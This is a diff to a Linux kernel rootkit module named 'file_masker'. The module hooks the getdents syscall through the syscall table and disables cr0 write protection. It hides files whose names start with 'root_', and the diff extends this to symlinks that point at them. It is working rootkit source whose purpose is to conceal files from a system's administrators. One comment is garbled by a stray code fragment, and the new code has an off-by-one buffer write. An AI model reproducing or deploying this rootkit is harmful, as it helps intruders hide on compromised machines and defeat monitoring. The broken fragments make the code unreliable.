@@ -31,12 +31,14 @@
 #include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
 
 #define PREF "root_"
+#define NAME_BUF_SIZE 200
 
 MODULE_LICENSE("GPL");
 
-
 void **sys_call_table;
 asmlinkage int (*getdents_syscall)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage long (*readlinkat_syscall)(int dfd, const char __user *path,
+				 char __user *buf, int bufsiz);
 
 /* Initialization function which is called when the module is
    insmoded into the kernel. It replaces the getdents() syscall. */
@@ -47,6 +49,7 @@ static int __init file_masker_start(void)
 	/* Store original getdents() syscall */
 	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
 	getdents_syscall = (void *) sys_call_table[__NR_getdents];
+	readlinkat_syscall = (void *) sys_call_table[__NR_readlinkat];
 
 	/* Replace in the system call table the original
 	   getdents syscall with our manipulated getdents */
@@ -82,6 +85,8 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 {
 	int nread;
 	int nread_temp;
+	char name[NAME_BUF_SIZE];
+	int size = 0;
 
 	/* Call original getdents_syscall */
 	nread = getdents_syscall(fd, dirp, count);
@@ -90,9 +95,20 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 
 	while (nread_temp > 0) {
 		nread_temp -= dirp->d_reclen;
+		size = 0;
 
-		if (should_mask(dirp->d_name)) {
-			printk(KERN_INFO "file_masker rootkit: hiding file %s\n", dirp->d_name);
+		set_fs(KERNEL_DS);
+		size = readlinkat_syscall(fd, dirp->d_name, name, NAME_BUF_SIZE);
+		set_fs(USER_DS);
+
+		if (size > 0)
+			name[size] = '\0';
+
+		if (should_mask(dirp->d_name) || (size > 0 && should_mask(name))) {
+			if (size > 0)
+				printk(KERN_INFO "file_masker rootkit: hiding link %s which points to file %s\n", dirp->d_name, name);
+			else
+				printk(KERN_INFO "file_masker rootkit: hiding file %s\n", dirp->d_name);
 			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
 			nread -= dirp->d_reclen;
 			continue;
@@ -110,7 +126,9 @@ asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, u
 
 void disable_write_protect_mode(void)
 {
-	/* Reading contents of control register cr0. The cr0 register has various
+	/* Reading contents of control register cr0. ThN_INFO "TEXT: %s\n", (lst +
+	 * 1));
+	 *
 	   control flags that modify the basic operation of the processor. */
 	unsigned long original_cr0 = read_cr0();
 
@@ -131,13 +149,25 @@ void enable_write_protect_mode(void)
 	write_cr0(original_cr0 | 0x00010000);
 }
 
+/* Function used to parse paths an extract the filename */
+char *strip_path(const char *name)
+{
+	char *lst = strrchr(name, '/');
+
+	if (lst != NULL)
+		return ++lst;
+
+	return name;
+}
+
 
 /* Function that checks whether we need to mask the specified pid */
 int should_mask(const char *name)
 {
-	char *res = strstr(name, PREF);
+	char *stripped = strip_path(name);
+	char *res = strstr(stripped, PREF);
 
-	return (res == name) ? 1 : 0;
+	return (res == stripped) ? 1 : 0;
 }
 
 
